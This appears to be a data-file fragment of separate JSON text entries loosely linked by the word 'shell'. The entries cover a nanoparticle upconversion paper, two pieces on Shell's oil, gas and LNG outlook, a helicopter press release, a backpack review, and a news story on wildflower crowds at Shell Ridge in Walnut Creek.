            "content": "To validate our hypothesis, we first explore how to realize the temporal control of red/green color-switchable upconversion of Er3+. In general, its emission profile consists of two adjacent green emission bands (2H 11/2 ,4S 3/2 \u2192 4I 15/2 transitions) and a red emission band (4F 9/2 \u2192 4I 15/2 transition) under the commonly used 980 nm excitation34,35,36. Note that the conventional Er3+/Yb3+ codoped materials usually show a fixed emission color, such as green for the regular NaYF 4 :Yb/Er@NaYF 4 core-shell nanoparticles under both continuous-wave (c.w.) and pulse 980 nm laser excitations (Supplementary Fig. 1a). However, it is interesting to observe a faster rise time for the green emission than that of the red emission (Supplementary Fig. 1b). This suggests that temporal control of emission colors would be highly desirable by pre-editing the steady-state upconversion emission profiles of Er3+. Here we introduced a small amount of Tm3+ in the Er/Yb couple to mediate the upconversion dynamics of Er3+. It can promote the population of Er3+ from its 4I 11/2 state to the lower-lying intermediate 4I 13/2 state through an energy-transfer looping (ETL) process, namely Er3+ (4I 11/2 ) \u2192 Tm3+ (3H 5 ) \u2192 Er3+ (4I 13/2 ), consequently leading to a red color output under c.w. 980 nm excitation (Fig. 2a; Supplementary Fig. 2).\n\nFig. 2: Red/green color-switchable upconversion in Er/Tm/Yb tri-doped nanoparticles. a Upconversion emission spectra of NaYF 4 :Er/Tm/Yb(15/0.5/40 mol%)@NaYF 4 and NaYF 4 :Er/Yb(15/40 mol%)@NaYF 4 core-shell nanoparticles under 980 nm excitation. b, c Upconversion emission intensity ratio of green emission (\u03b3) over the total emissions obtained from the NaYF 4 :Yb/Er/Tm(40/10-40/0.5 mol%)@NaYF 4 and NaYF 4 :Yb/Er/Tm(0-60/15/0.5 mol%)@NaYF 4 core-shell nanoparticles under c.w. and pulse excitations. d Normalized upconversion emission spectra of NaYF 4 :Yb/Er/Tm(40/15/0.5 mol%)@NaYF 4 core-shell nanoparticles under c.w. and pulse 980 nm excitations. e CIE (x,y) chromaticity diagram of emission colors of sample in (d).

Full size image\n\nA series of NaYF 4 :Er/Tm/Yb@NaYF 4 core-shell nanoparticles were synthesized by a modified co-precipitation method (Supplementary Note 1)26, showing sphere-like morphology and hexagonal phase (Supplementary Fig. 3). The inert NaYF 4 shell layer was used to prevent the lanthanide emitters in core from being quenched by surface quenchers. The upconversion emission colors are closely dependent on the concentrations of each lanthanide dopant (Fig. 2a\u2013c), and the doping of 15Er:0.5Tm:40Yb (mol%) results in an emission color change by only modulating the pulse width of 980 nm excitation laser (Fig. 2d, e; Supplementary Figs. 4\u201310 and Supplementary Tables 1\u20134). Namely, the sample shows red color under c.w. or long pulse (e.g., >8 ms for pulse width) 980 nm excitation; while it starts to present a gradual emission color change from red to orange, yellow and green with reducing the excitation pulse width down to 0.05 ms. As a control, other excitation wavelengths (e.g., 808 or 1530 nm) do not lead to an emission color change (Supplementary Fig. 11a, b). The recently reported NaErF 4 @NaYF 4 core-shell nanoparticles only show a red color under both c.w. and pulse 980 nm excitation (Supplementary Fig. 11c, d)37,38,39. In addition, the steady-state red upconversion of the Er/Tm/Yb tri-doped sample is much greater than that of the Yb/Ho/Ce tri-doped system (Supplementary Fig. 12). These observations confirm the feasibility of achieving emission color tuning of Er3+ through temporal control of its upconversion dynamics under conventional 980 nm excitation, laying a solid foundation for the following full-color tuning with a single wavelength excitation.\n\nTo shed more light on the upconversion mechanism of Er3+ in the Er/Tm/Yb tri-doped system, we measured the time-dependent upconversion emission profiles of the samples. As shown in Fig. 2f, it is interesting to observe a faster rise time for the green emission than the red emission during the excitation pulse width. This feature ensures the observation of green emission color by simply reducing the excitation laser pulse width. The faster rise time of green emission than that of red emission can originate from the difference in their upconversion processes. The green upconversion is based on the resonant energy transfer from Yb3+ (at its 2F 5/2 state) to Er3+ (at its intermediate 4I 11/2 state) followed by an up-transition process3. In contrast, for the red upconversion its intermediate 4I 13/2 state has to be pre-populated through a Tm3+-mediated ETL process and/or multi-phonon relaxation (MPR) from 4I 11/2 to 4I 13/2 (Supplementary Fig. 2b). Such additional processes result in a temporal delay in the up-transition of Er3+ to the red emitting 4F 9/2 state. Although the presence of Tm3+ accelerates the rise time of red emission, it is still slower than that of the green emission (Fig. 2f; Supplementary Fig. 13).\n\nAnother interesting observation in Fig. 2f is the abrupt drop in the time-dependent emission profile of Er3+ when the pulse duration is over ~0.5 ms. This suggests that some relatively slow depleting processes begin to occur at the green emitting levels. To shed more light on this issue, we prepared a set of core\u2013shell control samples with single doping of Er (15 mol%), and codoping of Er/Tm (15/0.5 mol%) and Er/Yb (15/40 mol%) in the core (Supplementary Fig. 14). Their time-dependent emission profiles were compared in Fig. 2g (top panel), showing no abrupt drop for all of them. Thus the abrupt decline of Er3+ should result from the cooperative modulation effect due to the presence of both Tm3+ and Yb3+, which work together to make a dynamic manipulation of Er3+ upconversion. Importantly, it was found that the lifetime of green emission exhibits a decrease for the Er-doped control samples after the presence of Tm3+ or Tm/Yb couple (Fig. 2h). The abrupt decline is presumably attributed to the cross-relaxation (CR) between Er3+ at its green emitting 2H 11/2 ,4S 3/2 states and Tm3+ at its intermediate 3F 4 state instead of the ground state 3H 6 . Taking into account a small energy mismatch (~1600 cm\u22121) 3, the energy transfer from Yb3+ (at its 2F 5/2 state) to Tm3+ (at its 3H 5 state) needs more time than that to Er3+ (at its 4I 11/2 state), which is a resonant process. As a result, the CR occurring at the 3F 4 state of Tm3+, populated by a rapid MPR process from the upper-lying 3H 5 state, would have a slower temporal feature. In this case, the upconversion emission based on the intermediate 3F 4 state of Tm3+ should also have a slower rise time than that of Er3+ (Supplementary Fig. 15). This was confirmed by the time-dependent upconversion emission profiles of Tm3+ (e.g., 695 and 800 nm emissions) upon 980 nm excitation (Fig. 2g bottom panel). For the Er/Tm (15/0.5 mol%) coupled control sample, much less Tm3+ ions populate at its 3F 4 state, which cannot support efficient CR processes, and there is no change in the emission color with tuning the pulse width of excitation laser (Supplementary Fig. 7a). While after the presence of Yb3+, much more Tm3+ ions were pumped in its 3F 4 state followed by the energy transfer from Yb3+ (2F 5/2 ) to Tm3+ (3H 5 ) and subsequent relaxation to its 3F 4 state, as evidenced by the remarkable enhancement of infrared emission of Tm3+ from its 3F 4 \u2192 3H 6 transition (Fig. 2i). In contrast, no obvious abrupt decline was observed in the Er/Yb codoped control sample, implying that the CR between Er3+ and Yb3+ has no notable contribution to the color change despite a decline in the lifetime of green emission (Supplementary Fig. 16)40,41,42. The observation of temporal abruptness was also in agreement with the simulation through rate equations via an upconversion model (Supplementary Fig. 17; Supplementary Note 2). Thus, we have demonstrated the key role of the Tm/Yb couple in manipulating both the rise and decay dynamics of Er3+, and the involved processes were schematically illustrated in Fig. 2j.\n\nWe next investigate how to realize the long-decay blue emission light together with a slower rise time than that of green and red emissions of Er3+. This is a prerequisite to single out the blue emission from the total upconversion emission profiles through the time-gating technique. Among a series of lanthanide ions, Tm3+ is a possible candidate for blue emission light by taking advantage of its 1G 4 \u2192 3H 6 transition (peaking at around 475 nm), which is widely observable in Yb3+/Tm3+ codoped systems upon 980 nm excitation (Fig. 3a) 4. However, a crucial issue for Tm3+ lies in the serious concentration quenching effect when it is doped into host with higher concentrations due to the multiple CR processes43,44,45, such as [1G 4 ; 3H 6 ] \u2192 [3H 4 ; 3H 5 ], which would result in a rapid decline in the lifetime of Tm3+ at its 1G 4 state in addition to decreased blue emission intensity (Fig. 3b, c). Other emission levels of Tm3+ show a similar result (Supplementary Fig. 18a). To get rid of this limit, we attempt to enlarge the ionic separation by employing a smaller Tm3+ dopant content, and the CR processes occurring in the blue emitting level were well suppressed, resulting in markedly prolonged lifetime (Fig. 3c). Also, it can be observed that a decrease of Tm3+ content helps to slow the rise time of blue emission (Fig. 3d), might be resulted from a greater Tm3+-Yb3+ ionic separation. This is a key point to remove the interference of blue emission on other emissions under short pulse 980 nm excitation. Relatively low doping of Yb3+ content is also helpful for intense blue emission with slower rise time and longer decay time (Fig. 3e; Supplementary Fig. 18b). Thus, the Yb/Tm couple with the concentration ratio of 20/0.1 mol% was selected for the on-demand blue emission light.\n\nFig. 3: Tuning rise and decay times of blue upconversion of Tm3+. a Schematic of blue upconversion of Tm3+ in Yb/Tm coupled system and possible CR processes that may result in quenching of the emissions. CR3 and CR4 stand for CR processes of [1G 4 ; 3H 6 ] \u2192 [3F 2 ; 3F 4 ] and [1D 2 ; 3H 6 ] \u2192 [1G 4 ; 3F 4 ], respectively. Insets compare the ionic interactions with and without CR for lower and higher Tm3+ dopant cases. b Upconversion emission spectra of NaYF 4 :Yb/Tm(20/0.1-1.0 mol%)@NaYF 4 core-shell nanoparticles under 980 nm excitation. c Dependence of 475 nm emission intensity and lifetime on Tm3+ dopant concentration for (b) samples. d, e Time-dependent upconversion emission profiles of Tm3+ at 475 nm from (b) samples and NaYF 4 :Yb/Tm(10-40/0.1 mol%)@NaYF 4 core\u2013shell nanoparticles upon pulse 980 nm excitation with a pulse width of 8 ms. Full size image\n\nTo achieve the single-wavelength responsive full-color output in a single nanoparticle, we construct an MLCS nanostructure to integrate each functional unit. In detail, the Yb/Tm couple was codoped into the core and Er/Tm/Yb into the outer luminescent shell layer, both of which were spatially separated by growing an optically inert NaYF 4 epitaxial interlayer aiming to avoid any spectral cross-talk between them26, and finally another NaYF 4 shell was coated outside to prevent surface quenching effect46. In such a design, a newly emerging issue encountered is that the blue emission from the core was concurrently activated along with the red emission upon c.w. 980 nm excitation (Supplementary Fig. 19; Supplementary Table 5). This means that the content of 40 mol% Yb3+ in the luminescent shell layer is not sufficient enough to block the 980 excitation photons reaching the blue light emitting core21,47. In this case, we attempted to use the Yb sublattice to raise Yb3+ content in the luminescent shell layer, some of which could act as the energy harvester to facilitate the trapping of incident 980 nm excitation photons and properly minimize the excitation energy to activate Tm3+ in the core (Fig. 4a, b; Supplementary Fig. 20), resulting in observation of red color output under c.w. 980 nm excitation. Also, it is still capable of enabling green emission light under short pulse 980 nm excitation due to the faster rise time of the green emission. More importantly, the lifetime of Tm3+ emission is much longer than that of Er3+ (Fig. 4c), which allows for the blue emission light output through the time-gating technique to filter out those short-decay emissions (Supplementary Note 3), resulting in RGB color-tunable emissions under suitable excitation modes (Fig. 4d). The RGB colors can be kept in a large range of pump power densities under 980 nm excitation (Supplementary Fig. 21; Supplementary Tables 6\u20138). We further examined the role of the inert NaYF 4 interlayer between the core and luminescent shell (Supplementary Fig. 22) and found that it is indispensable for the observation of the blue emission by suppressing the interfacial quenching effect (Supplementary Figs. 23\u201326). In comparison, the thickness of the outermost NaYF 4 shell has a slight effect on the color tuning besides a change in the luminescence intensity (Supplementary Figs. 27\u201331). So far, we have successfully realized the RGB colors output in an MLCS nanoparticle by simply tuning the excitation modes of a single 980 nm laser (Fig. 4e) for the first time to the best of our knowledge (Supplementary Table 9).\n\nFig. 4: Single-wavelength responsive full-color tuning of upconversion and its potential application. a, b Schematic of the NaYF 4 :Yb/Tm(20/0.1 mol%)@NaYF 4 @NaYbF 4 :Er/Tm(15/0.5 mol%)@NaYF 4 MLCS sample and corresponding TEM image, high-resolution TEM image and Fourier transform diffraction pattern. c Decay curves of the upconverted red, green, and blue emissions from (b) sample under pulse 980 nm excitation. d, e Upconversion emission spectra of (b) sample under 980 nm excitation with modes of c.w., short pulse, and time-gating technique, respectively. f Schematic of the full-color volumetric display using the (b) sample by simply altering the excitation modes.

Full size image\n\nThe realization of primary RGB color-switchable emissions permits new chances for frontier photonic applications. As a proof of concept, we prepared a painting of a \u201cbutterfly-over-rose\u201d pattern using such nanoparticles through the screen printing method (Fig. 4f top). Interestingly, it can precisely show a red rose flower under c.w. 980 nm irradiation, green leaves, and bud under short pulse 980 nm irradiation, and then blue butterfly under the time-gating mode (Fig. 4f; bottom right panel). In contrast, under regular c.w. 980 irradiation the entire painting only shows a single red color (Fig. 4f; bottom left panel). More colors can be easily achievable by fine-tuning the pulse widths of the incident laser (Fig. 4g). This may contribute to the full-color volumetric display under a single excitation wavelength and reduce the complexity of pump systems18. As an added benefit, such smart control of emission light colors also holds great promise in multi-level anti-counterfeiting26. The concealed information can be clearly distinguished by applying a time-gating technique and 1530 nm irradiation (Fig. 4h; Supplementary Fig. 32).",

            "content": "We recently published a list of Billionaire\u2019s 15 Favorite Oil and Gas Stocks Right Now. In this article, we are going to take a look at where Shell plc (NYSE:SHEL) stands against other billionaire\u2019s favorite oil and gas stocks right now.\n\nThe oil and gas industry is a significant driver of the global economy, influencing industries, transportation, and geopolitical dynamics. However, the past year has been nothing short of a roller coaster for the sector, with high volatility coming from factors such as geopolitical tensions, natural disasters, supply chain disruptions, and a dampening demand due to a global economic slowdown.\n\nREAD ALSO: 11 Best Natural Gas Stocks To Buy Now\n\nBrent crude prices have recently hit a 6-month low as US crude oil stockpiles posted a larger-than-expected build, coupled with worries about a looming return of more OPEC+ barrels to the market and President Trump\u2019s tariffs on Canada, Mexico, and China. The global oil and gas majors have already struggled with decreasing prices in 2024 and the recent decline has only added to their troubles. Things could get even worse, as the IEA expects Brent crude prices to fall further to $66 a barrel in 2026.\n\nMeanwhile, as the US oil and gas production hits record highs, President Trump has made calls to \u201cDrill, Baby, Drill\u201d and pump those numbers up even higher, as he seeks to make the country self-sufficient in energy. However, not everyone seems to be on. Instead of continuously increasing supply and hence plunging prices even lower, the oil industry remains focused on achieving efficiency gains and maintaining capital discipline, while also rewarding loyal shareholders through dividends and share repurchase programs. According to a report by Janus Henderson, companies in the energy sector distributed over $49 billion in dividends during the third quarter of 2024, up from $32.2 billion three years ago.\n\nHowever, the same cannot be said of the natural gas sector. US gas producers, which curbed production last year due to multi-year low prices, are now adding gas rigs and boosting production as the price has crossed the $4.6 mark this week. The slowing output in 2024, a booming LNG industry, and fast-depleting inventories during the coldest winter in years have driven gas prices up by over 150% over the last year.\n\nAnother significant growth driver for America\u2019s natural gas industry is the ongoing artificial intelligence boom and the accompanying data centers, which consume 10 to 50 times the amount of energy per square foot of a typical commercial office building. These energy intensive facilities could consume as much as 9% of all energy generated in the US by 2030, and this energy needs to come from a relatively clean, flexible, and reliable source that is abundantly available in the form of natural gas. According to energy data provider Enverus, a total of 80 new gas power plants could be constructed in America by the end of the decade, adding about 46 GW of new capacity \u2013 20% higher than the gas capacity additions in the last five years. Several gas majors are now even bypassing traditional utilities and building power plants to connect directly to data centers, a move that could reshape the industry in the years to come, if it pays off.",

            "content": "Last month, UK oil and gas major Shell released its annual Liquefied Natural Gas (LNG) Outlook, laying out the bullish case for LNG market growth over the next 15 years. This year, the company increased its demand expectations to between 630 and 718 million tonnes per annum (MTPA) by 2040, 1-5% higher than last year\u2019s projection.\n\nHowever, the latest outlook is heavy on investor optimism but light on details. It provides less justification for bullish demand scenarios than in previous years, and key demand drivers that featured prominently in 2024 were downplayed or omitted entirely.\n\nAs a result, Shell\u2019s underlying rationale for rapid LNG demand growth appears increasingly fragile. While higher projections justify the company\u2019s sizable LNG portfolio, they mask fundamental flaws in the LNG growth thesis and financial risks for investors.\n\nFundamental flaws in Shell\u2019s LNG thesis\n\nShell forecasts that LNG trade will grow rapidly for the remainder of the decade, followed by slower growth in the 2030s. Last year, the company anticipated global demand peaking in the 2040s, but its latest high-demand scenario now suggests a peak in 2039.\n\nExpectations for rapid LNG demand growth face several fundamental pitfalls. First, the company believes LNG will provide the largest share of global natural gas demand growth through 2040. However, over the last 20 years, the majority of incremental demand has been met by gas that is domestically produced, not traded.\n\nWith the exception of China, natural gas consumption has grown mainly in countries that produce enough gas to either be self-sufficient or net exporters, like the U.S. By contrast, gas demand has tended to fall in markets that require large import volumes, like Europe and Japan. By banking on LNG as the largest growth driver, Shell expects the natural gas trade to break out of a trend that has existed for over two decades.\n\nA second issue is that under Shell\u2019s high-growth scenarios, demand exceeds supply through 2040, implying that tight markets could maintain upward pressure on global prices. This is paradoxical as high prices hinder LNG\u2019s ability to compete with other fuels, like coal and renewables, thus limiting LNG demand.\n\nWhile lower prices will be necessary to stimulate growth, particularly in emerging economies, they would also result in smaller returns for LNG companies and their shareholders - a point conspicuously overlooked.\n\nFinally, Shell\u2019s newest outlook departs from previous arguments about the key drivers of incremental LNG demand. It downplays LNG\u2019s role in the power sector and no longer emphasizes claims that LNG can displace coal in Asia.\n\nInstead, Shell\u2019s outlook now argues that data centers and artificial intelligence (AI) will drive long-term LNG demand without providing any evidence. Ongoing innovations have demonstrated how energy-efficient AI models can undermine the need for gas investments. Although Shell attempts to capture recent market hype, the impact of AI on LNG demand remains highly uncertain.\n\nIndia and China take center stage, while Southeast Asia takes a backseat\n\nShell\u2019s latest outlook also pivots away from LNG growth in Southeast Asia, instead highlighting LNG infrastructure investments and potential LNG use for transport in India and China.\n\nHowever, China\u2019s domestic gas production and pipeline imports are growing faster than LNG due to lower costs. Domestic production accounted for almost half of the country\u2019s natural gas demand growth last year, while pipeline flows from Russia have reached full capacity. China\u2019s LNG imports increased in 2024 but failed to surpass 2021 levels, and LNG purchases fell to five-year lows in February 2025. Recent trade tensions with the U.S. only validate China\u2019s strategy to prioritize other gas supplies.\n\nShell suggests that China and India will see higher LNG demand for trucking. China\u2019s LNG truck fleet has nearly tripled since 2019, but government data indicates that the country liquefies enough of its own natural gas to meet trucking demand without imported LNG. Wood Mackenzie recently concluded that China\u2019s \u201csurge in LNG trucks will not last\u201d due to the growth of battery electric trucks. India is significantly farther behind in adopting LNG trucks, and scalability remains a persistent challenge.\n\nThe affordability of LNG also remains highly questionable in India. Between 2016 and 2024, India\u2019s LNG consumption remained relatively flat in nearly all sectors except for fertilizer, which relies on large government subsidies to maintain low consumer prices. LNG demand has remained limited in sectors that do not receive fiscal support. For example, global LNG prices would have to fall by half to compete in power generation, where gas provides less than 2% of the electricity mix.\n\nWhy did Shell omit details about Southeast Asia in its latest outlook? One potential reason is that the downside risks to the region\u2019s demand growth became even more apparent in 2024.\n\nVietnam provides a clear example. The country\u2019s latest Power Development Plan initially targeted 22 gigawatts (GW) of LNG-fired power capacity by 2030, but a recent draft revision lowered the target to 18GW due to slow progress. To date, only one LNG plant with 1.6GW of capacity has secured a power purchase agreement. Very few other projects may be operational before 2030. Vietnam\u2019s wind and solar generation now exceeds gas-fired power generation, which has fallen 45% since 2015.\n\nLNG demand in emerging Asian markets has vastly underwhelmed historical growth forecasts. For example, in 2019, some expected combined imports from Thailand, Vietnam, the Philippines, Bangladesh, and Pakistan to reach 56MTPA in 2025 and 83MTPA by 2030. In 2024, imports to those countries were just 27MTPA.\n\nGrasping at straws\n\nAll told, the volume of LNG traded in 2024 grew by its lowest level since 2012, according to Kpler data. While Shell\u2019s latest LNG Outlook increased overall demand expectations by 2040, the underlying drivers for growth appear flimsy. Rather than acknowledge fundamental issues or downside risks to its core LNG thesis, Shell seems to be selectively grasping at straws to validate its long-term LNG gamble.",

The helicopter is the first from the worldwide H160 fleet to conduct offshore commercial transportation missions.\n\nStarting in 2020, the three companies \u2013 Airbus, PHI and Shell \u2013 began working on a new partnership. In a groundbreaking initiative, Airbus provided PHI and Shell with one H160 in 2024 ahead of the final total of four deliveries for a route-proving programme that allowed both the operator and final customer to become familiar with the aircraft\u2019s advanced technology and safety features, as well as place the aircraft into controlled operations to better understand the performance. Following the 300 hours of route-proving flights, PHI now counts 12 H160-type-rated pilots and 12 H160-qualified A&P mechanics among its ranks.\n\n\u201cThis is a long anticipated milestone that will bring material advantages to our offshore operations in the Gulf of America,\u201d said Tony Cramp, Shell\u2019s Vice President Aircraft. \u201cThe H160 represents a new generation of rotorcraft with the potential to enhance safety and passenger experience for our people, while giving our business greater operational capability and availability, driving business efficiencies. We look forward to seeing how it performs when in full regular service, with a view to replication in other regions.\u201d\n\n\u201cThis is the culmination of five-plus years of work and an even longer partnership between PHI, Shell and Airbus,\u201d said Scott McCarty, CEO \u2013 PHI Group. \u201cThe extensive, first-of-its-kind route-proving program allowed our teams to work closely with Shell and Airbus to fully evaluate and optimize the H160\u2019s capabilities, train personnel and ensure certification and indoctrination into PHI\u2019s operational and safety systems. I want to recognize and thank everyone who came together and helped make this route-proving program extremely successful. We are proud and honored to launch this next-generation aircraft in the Gulf of America.\u201d\n\n\u201cSpeaking on behalf of all of the Airbus teams that have been fully dedicated to ensuring a smooth entry into service for the H160, we were honoured to be part of this unique partnership with Shell and PHI,\u201d said Bruno Even, CEO of Airbus Helicopters. \u201cWith this outside-the-box approach, the route-proving programme allowed us to closely collaborate alongside the operator and final customer so all of the teams involved had the necessary support to achieve their missions with the maximum level of safety and efficacy. We are thrilled to see the H160 entering into commercial transportation operations. We are grateful to PHI and Shell for trusting Airbus and committing to raising the bar on offshore transportation operations.\u201d\n\nThe H160 is one of the world\u2019s most technologically advanced helicopters, designed and built to deliver the highest levels of operational safety while providing unmatched comfort for rotorcraft in its class. Capable of performing wide-ranging missions including law enforcement, offshore transportation, search and rescue, private and business aviation, and emergency medical services, the H160 has entered into service in Brazil, Canada, France, Japan, Malaysia, Philippines, Saudi Arabia, U.K., U.S. and many other European countries.\n\n\u201cAt Shell, we lead in safely supplying energy to our customers from the offshore and from the beginning of this industry, we have innovated our way to the future. Our aviation partner, PHI, has been with us for the long term and now we\u2019ve partnered together to introduce the Airbus H160. We welcome this new helicopter into service to safely transport our people to and from work offshore in the Gulf of America for many years to come,\u201d said Colette Hirstius, Senior Vice President, Gulf of America, Shell.\n\nWith the entry into service of the first North American H160 Full Flight Simulator (FFS) in 2026, located in the Helisim simulation centre in Grand Prairie, Texas, Airbus continues to support the H160's growing success. As the market demand continues to grow, Airbus is currently exploring options to locate future FFS in growth areas such as Brazil and Australia, among others.\n\n@AirbusHeli #MakingMissionsPossible #VERTICON2025",

            "content": "Triple Aught Design has been producing the FAST Pack Litespeed backpack for over a decade, and while the tactical gear purveyor has offered the pack in a huge variety of different variants, the vast majority of these updated specs have consisted of different shell constructions, from sailcloth to waxed canvas to ballistic nylon. So, while the announcement of yet another new material version of TAD\u2019s FAST Pack Litespeed may not sound like all that big of a deal we\u2019d argue this is unequivocally the most advanced and noteworthy backpack the company has ever produced. Introducing, Triple Aught Design\u2019s new FAST Pack Litespeed Black Magic Edition.\n\nPhoto: TAD\n\nCarry-Able Real Estate\n\nMeasuring 10.00\u2033 wide x 20.00\u2033 tall x 6.75\u2033 deep, TAD\u2019s new Black Magic Edition FAST Pack Litespeed offers 22 liters of internal storage space \u2014 though its exterior can accommodate various attachments that can increase its hauling capacity. Despite the insanely hardwearing nature of this 22-liter EDC pack, the entire thing manages to tip the scales at only 3.1lbs (or 49.6oz).\n\nA True Masterclass In Modularity\n\nLike every existing version of the FAST Pack Litespeed, the new Black Magic Edition sports an incredibly modular design that can accommodate a huge variety of different add-ons, attachments, and optional panels and accessories. The bag\u2019s basic layout includes a zipper-secured top front admin pocket with internal organizer slots, plus a middle front storage pocket that\u2019s also zipper-secured, and finally a pair of internal zippered mesh pockets. This might make the pack sound somewhat spartan, but that\u2019s because it is. By having a more minimalistic design that can be supplemented via its huge bevy of available attachments, the backpack is able to lend itself to an enormous variety of applications \u2014 or like TAD says, \u201cfrom the battlefield to the boardroom.\u201d Removable compression straps further enhance this bag\u2019s modularity and versatility.\n\nPhoto: TAD\n\nA Shell That Looks Down On \u201cRegular\u201d Dyneema\n\nWhat makes the Black Magic Edition of the FAST Pack Litespeed so special is unquestionably its shell construction. From Challenge Sailcloth\u2019s new ULTRA line, the Black Magic Edition is cut from a wildly advanced material known as ULTRA 400X. Incredibly lightweight and insanely cut, tear, and abrasion-resistant, as well as hydrophobic, and chemical and UV-resistant, ULTRA 400X starts out as already-insanely hardwearing amalgamation of high-tenacity polyester and Dyneema, though instead of being crafted from loose UHMWPE fibers laminated to a backing, Challenge\u2019s R&D team has improved the material by taking these same UHMWPE fibers and bundling the strands and then finally weaving them into fabric. From there, the 4.65-ounce construction is bestowed with an integrated grid of CrossPly reinforcement fibers and Challenge RUV film laminate adorning the construction\u2019s rear face, massively improving waterproofing, with this material being waterproof to 200 PSI.\n\nHardware Selected Without A Concern For Cost\n\nThe bag is constructed around an HDPE frame sheet. The Black Magic Edition\u2019s ULTRA 400X shell construction has been treated to HYPALON synthetic leather reinforcements and an interior that\u2019s fully lined in X-Pac VX-07 Ripstop. Continuing the pack\u2019s spare-no-expense material selection are a set of shoulder straps with spacer mesh stuffed with Evazote closed-cell cross-linked ethylene copolymer foam. In terms of hardware, TAD has laced the bag up with YKK #5 and #8 reverse-coil zippers, and Web Dominators, Looploc anchor points, SR Ladderloc buckles, and Cordlocs, Ladderlocs, Tri-Glides, all from ITW GhillieTEX. There are also mil-spec metal triglides to accommodate an available transporter tail attachment.\n\nMeticulously Made In Our Backyard\n\nIt\u2019s not just this backpack\u2019s design, shell construction, and other top-shelf materials that make it so special, but also its super meticulous build quality. Using extremely high standards for craftsmanship and employing super stringent quality control measures, the entire backpack is sewn in Los Angeles. This next-level build quality allows this backpack to be that much more bulletproof.\n\nPhoto: TAD\n\nWhy We Love It\n\nTriple Aught Design\u2019s original FAST Pack Litespeed was already a ridiculously-well-designed backpack, so it\u2019s legitimately impressive that the company was able to improve on it in such a major way. The use of ULTRA 400X will also likely raise the bar in the bag shell construction space and set a new standard for durability, cut, abrasion, and tear, resistance, and, of course, weatherproofing. We also love that the backpack was made right here in our backyard in Los Angeles. Sure, the Black Magic Edition FAST Pack Litespeed doesn\u2019t come cheap, but between the spare-no-expense material and hardware selection, and the American manufacturing, we\u2019d actually argue this carry solution\u2019s MSRP is somewhat justified.\n\nSpec Sheet\n\nBrand: Triple Aught Design\n\nModel: FAST Pack Litespeed Black Magic Edition\n\nShell: Challenge Sailcloth ULTRA 400X\n\nLining: X-Pac VX-07 Ripstop\n\nVolume: 22L\n\nDimensions: 10.00\u2033 W x 20.00\u2033 H x 6.75\u2033 D\n\nInternal Structure: HDPE Frame Sheet\n\nReinforcements: Hypalon Synthetic Rubber\n\nFoam: Evazote Closed Cell Cross-Linked Ethylene Copolymer\n\nWeight: 3.1LBs\n\nManufacturing Origin: USA\n\nPricing & Availability\n\nOffered exclusively in a fully blacked-out colorway, the Triple Aught Design FAST Pack Litespeed Black Magic Edition is available for order now \u2014 albeit in limited numbers \u2014 with pricing starting from $550.",

Douglas Zimmerman/SFGATE\n\nIn recent years, the spring season has inspired thousands of people to caravan to Shell Ridge, the largest, and arguably the greenest, open space in Walnut Creek, to take pictures of California\u2019s iconic wildflowers. By the time March rolls around, these influencers, who come from near and far, drag their mountain bikes and camera equipment through the delicate flower plots, sometimes even meditating in them for pastoral photo opportunities. Now, in preparation for the onslaught of visitors, the local community is fighting to protect the landscape \u2014 and its limited parking spaces \u2014 from superbloom mayhem.\n\nAs of this past weekend, signs have been placed near Shell Ridge\u2019s Sutherland Drive entrance, forbidding anyone from parking on the street on Saturdays and Sundays unless they have a permit. The Sutherland Drive parking lot is also closed on weekends. According to local officials and community representatives, this is a necessary measure to support nearby residents, who must navigate the impending vehicular chaos.\n\nAdvertisement Article continues below this ad\n\nA sign near Shell Ridge Open Space in Walnut Creek, Calif., March 10, 2025. Douglas Zimmerman/SFGATE\n\n\u201cIt looks like Disneyland,\u201d Elise Fornaci, a member of the Sutherland Drive and Virginia Court Neighborhood Association, told SFGATE over the phone Monday. For the past two years, throngs of visitors have clogged up the streets from the end of March to about May, blocking driveways, fire hydrants and mailboxes. The number of people prevented emergency vehicles, as well as local garbage collectors, from traveling through the area, she said. A video Fornaci shared with SFGATE from April 2024 shows dozens of cars crowding Sutherland Drive and Virginia Court, moving in and out of the quiet residential area while groups of people walk along the road.\n\n\u201cWe\u2019re trying to make sure that our neighborhood is safe and we don\u2019t have a catastrophic incident here,\u201d she continued, saying she\u2019s thankful that the city has finally taken measures to support East Bay locals \u2014 a project that\u2019s been a year in the making.\n\nAdvertisement Article continues below this ad\n\n\u201cWe are partnering with the City of Walnut Creek to provide a workable solution to protecting the safety and quality of life for residents but also provide public access to the open space,\u201d Contra Costa County Supervisor Ken Carlson told SFGATE in a statement. \u201cI don\u2019t believe anyone anticipated the viral response to the wildflower bloom when the Walnut Creek Open Space Foundation initiated the seeding.\u201d\n\nThe California Buttercup dots the landscape at Shell Ridge Open Space in Walnut Creek Calif., March 10, 2025. Douglas Zimmerman/SFGATE\n\nThis isn\u2019t the first time the community has tried to push back on these crowds of influencers, either. Last year, a sign mysteriously appeared in the area to deter people from trampling the flowers, SFGATE previously reported.\n\n\u201cDon\u2019t Location Tag on Social Media,\u201d the sign by the park entrance read. \u201cProtect this place. Use generic tags like Bay Area.\u201d Phil Johnson, a retired landscape contractor and volunteer at the time who found the sign propped up against a fence the year before, suspected it came from a frustrated neighbor who was unable to park among the hordes of visitors.\n\nAdvertisement Article continues below this ad\n\n\u201cSurprisingly, one of our biggest problems is professional photographers coming out here,\u201d Johnson previously told SFGATE, explaining that hundreds of people visited each weekend. According to Fornaci, at least 1,500 cars created gridlock traffic in the area at the time. What\u2019s even more frustrating, she said, is that Walnut Creek\u2019s so-called \u201csuperbloom\u201d isn\u2019t even that impressive.\n\nCalifornia Poppy flowers line a ridge at Shell Ridge Open Space in Walnut Creek Calif., March 10, 2025. Douglas Zimmerman/SFGATE\n\n\u201cIt\u2019s literally a quarter of a mile walk,\u201d Fornaci told SFGATE. \u201cVery disappointing thing to come to if you\u2019re looking for California flowers everywhere.\u201d\n\nAdvertisement Article continues below this ad\n\nOverall, she stresses that the park has more than a dozen entrances and encourages the public to visit the area through other means. \u201cIt\u2019s a beautiful place to hike, and people should absolutely enjoy it,\u201d she said. It just \u201cneeds to be done in a way that doesn\u2019t create a safety issue for our neighborhood.\u201d",

